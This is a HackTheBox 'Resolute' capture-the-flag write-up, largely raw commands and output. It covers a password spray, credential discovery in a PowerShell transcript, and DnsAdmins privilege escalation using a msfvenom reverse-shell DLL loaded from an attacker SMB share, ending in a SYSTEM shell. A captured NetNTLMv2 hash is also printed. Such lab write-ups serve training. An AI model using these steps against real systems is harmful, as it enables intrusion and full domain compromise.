---
title: HackTheBox-Resolute
date: 2024-12-24 09:41:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [DevelopGroup, DnsAdmin]     # TAG names should always be lowercase
---

## SMB-enum

    ➜  resolute nxc smb 10.10.10.169
    SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)

## querydispinfo

    rpcclient $> querydispinfo
    Name: Marko Novak       Desc: Account created. Password set to Welcome123!

## password-spray

    ➜  resolute nxc smb 10.10.10.169 -u users.txt -p 'Welcome123!' --continue-on-success
    SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 

## winrm-enum


    ➜  resolute evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'

    *Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


    PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
    >> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

## found vuln


    *Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /all

    USER INFORMATION
    ----------------

    User Name     SID
    ============= ==============================================
    megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


    GROUP INFORMATION
    -----------------

    Group Name                                 Type             SID                                            Attributes
    ========================================== ================ ============================================== ===============================================================
    Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
    BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
    BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
    MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
    MEGABANK\DnsAdmins


## DnsAdmins

### create payload
    ➜  resolute msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f dll > privesc.dll
### start smb server
    ➜  resolute sudo impacket-smbserver s .
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed

### playin with dnscmd.exe
    *Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.4\s\privesc.dll

    Registry property serverlevelplugindll successfully reset.
    Command completed successfully.

    *Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\resolute stop dns

    SERVICE_NAME: dns
            TYPE               : 10  WIN32_OWN_PROCESS
            STATE              : 3  STOP_PENDING
                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x1
            WAIT_HINT          : 0x7530
    *Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\resolute start dns

    SERVICE_NAME: dns
            TYPE               : 10  WIN32_OWN_PROCESS
            STATE              : 2  START_PENDING
                                    (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x0
            WAIT_HINT          : 0x7d0
            PID                : 1704
            FLAGS              :
    *Evil-WinRM* PS C:\Users\ryan\Documents> 

### grab HASH

its not crackable


    ➜  resolute sudo impacket-smbserver s .
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Incoming connection (10.10.10.169,50870)
    [*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
    [*] User RESOLUTE\RESOLUTE$ authenticated successfully
    [*] RESOLUTE$::MEGABANK:aaaaaaaaaaaaaaaa:37cdea4692c9fe2952976b72dcfebfd3:01010000000000000060bec43555db017f1cdf274e4ceb4f0000000001001000650065007800580045006700570078000300100065006500780058004500670057007800020010004b006d004400660072006c0054006900040010004b006d004400660072006c0054006900070008000060bec43555db0106000400020000000800300030000000000000000000000000400000e2a3540882cfffffba285192578f8afb6efdbadc4cbea7333c79894de200cd850a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000

### reverse shell
    ➜  resolute nc -nvlp 443
    listening on [any] 443 ...
    connect to [10.10.14.4] from (UNKNOWN) [10.10.10.169] 50965
    Microsoft Windows [Version 10.0.14393]
    (c) 2016 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

Video Walwalkthrough
[WATCH!](https://youtu.be/Dg9ZncvRL_Q)